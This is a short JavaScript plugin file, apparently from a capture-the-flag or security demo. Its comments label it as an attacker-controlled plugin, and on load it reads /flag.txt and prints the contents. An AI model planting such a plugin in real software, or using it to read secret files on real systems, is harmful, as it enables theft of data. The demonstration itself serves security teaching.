// plugins/evil.js
// This shows what an attacker-controlled plugin could do once integrity is broken.

const fs = require('fs');

module.exports.init = function () {
  try {
    const flag = fs.readFileSync('/flag.txt', 'utf8');
    console.log('[evil plugin] flag:', flag.trim());
  } catch (e) {
    console.error('[evil plugin] failed to read flag:', e.message);
  }
};
